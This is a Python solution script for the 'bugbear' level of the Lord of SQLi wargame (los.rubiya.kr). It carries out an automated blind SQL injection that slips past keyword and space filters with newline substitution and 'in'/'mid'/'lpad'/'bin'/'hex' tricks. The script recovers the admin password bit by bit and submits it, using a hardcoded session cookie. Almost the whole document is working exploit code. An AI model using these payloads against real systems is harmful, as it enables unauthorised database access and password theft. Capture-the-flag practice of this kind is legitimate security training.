import requests

def get(pw, no):
    return requests.get(
        'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php',
        params={"pw":pw.replace(' ', '\n'), 'no': no.replace(' ', '\n')},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get length
length = 1
while True:
    print("Try length", length)
    if "<h2>Hello admin</h2>" in get('', f'9999||id in ("admin")&&length(pw) in ({length})'):
        break
    length += 1
print("Length is", length)

# get password
password = ''
for index in range(1, length + 1):
    tmp = ''
    for bit in range(1, 8):
        if "<h2>Hello admin</h2>" in get('', f'9999||id in ("admin")&&mid(lpad(bin(hex(mid(pw,{index},1))),7,0),{bit},1)'):
           tmp += '1'
        else:
            tmp += '0'
    password += chr(int(str(int(tmp, 2)), 16))
    print(password)

# password is 

# certify
print(get(password, ''))